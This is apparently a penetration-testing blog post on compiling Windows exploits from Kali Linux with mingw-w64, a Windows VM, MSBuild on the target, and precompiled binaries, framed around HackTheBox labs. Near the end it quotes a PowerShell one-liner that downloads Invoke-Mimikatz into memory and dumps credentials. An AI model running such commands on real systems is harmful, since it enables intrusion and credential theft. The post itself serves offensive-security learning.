---
layout: post
title: Compile Windows Programs in Kali Linux
category: Tools
tags: windows building exploit
date: 2023-04-19 20:51 +0300
---

There are a lot of situations, when you have to compile an exploit for a specific version of Windows, for example, to make a privilege escalation. But you have only Kali Linux and no idea how to deal with these exploits in Visual Studio Projects format.

Today we are going to learn about ways we can compile our exploits using Kali Linux and additional software.

> Funny story: I was doing some lab on HackTheBox and I had to upload a compiled version of Rubeus. I had no idea how to compile Windows programs, and I had only Kali Linux. So I’ve started to search some pre-compiled versions on the Internet. And I really found a pre-compiled base64 version of the program, which did not work for me. I’ve spent a few hours on this searching, and finally I got the “right” version of the Rubeus, which worked for me. After some amount of time I’ve realized that I could do it much easier. It was so terrible🤣.

# Cross-compiler

If you want to compile your exploit right on your Kali Linux machine, you can use cross-compilation tools, like `mingw-w64`. It is used to compile Windows programs on Linux.

```bash
sudo apt install mingw-w64
```

For example, you have a x86 victim machine and an exploit for it. You may want to compile an exploit written in `C` language. You can use the commands below to do that.

```bash
searchsploit -m 42341
i686-w64-mingw32-gcc 42341.c -lws2_32 -o exploit.exe
```

![Compiling with mingw-w64](/assets/tools/compile-windows-programs-in-kali-linux/mingw.png)

# Virtual Machine

It is recommended to install a VM on your side to test your exploits/theories about the target. So, you can compile the program right on that machine. But be sure to install right target’s version of the operating system.

Firstly, you have to install the iso image of the OS. You can download the right version of Windows on [Microsoft website](https://www.microsoft.com/en-gb/software-download/windows10), the [Internet Archive](https://archive.org/details/windows-10-2022-update-version-22h2) or other sites. I provided links to Windows 10 Update Version 22H2 just for example.

Then, create a VM in virtualization software you like. I used to work with VirtualBox, but now I use VMWare Workstation Player, it seems better for me.

![Creating a VM in VMWare Workstation Player](/assets/tools/compile-windows-programs-in-kali-linux/vmware.png)

If you did it well, feel free to use new VM not just to compile programs for it. You can explore the system for file system, default settings, testing your exploits, etc…

# On the victim machine

It is a very low-possible way, but why not? If the target machine has a compiler installed, then we can use it to compile projects right on the target machine.  

For example, to build [Rubeus](https://github.com/GhostPack/Rubeus), a C# project just with command line you have to use `MSBuild` binary. I’ve found its location on [StackOverFlow](https://stackoverflow.com/questions/44567280/where-is-msbuild-exe-installed-in-windows-when-installed-using-buildtools-full-e), the root of it is `C:\Program Files (x86)\Microsoft Visual Studio`. There you can find the year of installed version, then go to build tools and you’ll get it.

Copy the binary path, change your current directory to the project directory and use the binary from there.

```powershell
 "C:\Program Files (x86)\Microsoft Visual Studio\2017\BuildTools\MSBuild\15.0\Bin\MSBuild.exe"
```

![Building Rubeus with MSBuild](/assets/tools/compile-windows-programs-in-kali-linux/msbuild1.png)

![Building Rubeus with MSBuild](/assets/tools/compile-windows-programs-in-kali-linux/msbuild2.png)

Then, enjoy your program!

![Using Rubeus after MSBuild](/assets/tools/compile-windows-programs-in-kali-linux/msbuild3.png)

Also, developers machines always include some kind of IDEs with a lot of useful tools installed. So, if you have a RDP connection, then why not to use the legitimate developer tools 😀. 

# Find pre-compiled versions

## Kali Linux windows binaries

The Kali tools provides some pre-compiled Windows binaries installed with operating system. The `windows-binaries` is a package, which can be installed with `apt`.

```bash
sudo apt install windows-binaries
```

After installation, you can enter the `windows-binaries` command to get a list of pre-compiled binaries. Also, you will change your working directory to package installation directory.

![windows-binaries command output](/assets/tools/compile-windows-programs-in-kali-linux/windows-binaries.png)

## The Internet

There are a lot of pre-compiled versions of useful binaries. They can be even ported in PowerShell scripts.

For example, you can find an [Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) script. If we look at its source code, we can find Base64 strings for 64-bit and 32-bit systems.

![Invoke-Mimikatz Source code](/assets/tools/compile-windows-programs-in-kali-linux/invoke-mimikatz.png)

You can just download and use that script. But there is no guarantee it would work on your system. Here is a quick in-memory usage example from [HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials#invoke-mimikatz).

```powershell
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds # Dump creds from memory
```

# Conclusion

Today we explored ways to compile Windows programs. You can use these methods to use your exploits on target machines. If you know another ways to do that, feel free to write a comment.

Thank you for reading, I hope it was useful for you ❤️
